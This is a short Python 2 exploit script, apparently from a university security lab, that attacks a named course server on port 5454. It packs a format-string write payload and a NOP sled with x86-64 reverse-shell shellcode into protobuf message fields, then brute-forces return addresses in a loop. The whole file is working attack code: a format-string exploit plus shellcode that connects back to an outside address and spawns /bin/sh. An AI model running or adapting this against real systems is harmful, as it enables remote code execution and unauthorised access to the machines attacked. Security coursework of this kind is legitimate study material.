import socket
import struct
import sys
import msg_pb2

v0 = 0x643001
base_addr = 0x63f378
base_off = 11
stride = 64

# port is 50905
shellcode = '\x90' * 100 + \
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97" + \
"\x48\xb9\x02\x00\xc6\xd9\x81\x0a\x75\x64\x51\x48\x89\xe6" + \
"\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce" + \
"\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f" + \
"\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48" + \
"\x89\xe6\x0f\x05" + 'x' * 100


def echo(payload) :
 msg_len = len(payload)
 length = struct.pack('<H',msg_len)
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect(("guldendraak.ccs.neu.edu",5454))
 s.sendall(length+payload)
 data1 = s.recv(1024)
 data2 = s.recv(1024)
 return length

def gen_exploit(v0):
 buf = '%0{0}x%{1}$ln'.format(v0,base_off)+struct.pack('<Q',base_addr)
 req = msg_pb2.CertReq()
 req.user = buf
 req.nonce = shellcode
 req.data = shellcode
 return req.SerializeToString()
 

while v0 < 0x643fff :
 print 'Tring return address ' + str(hex(v0))
 payload = gen_exploit(v0)
 echo(payload)
 v0 += stride
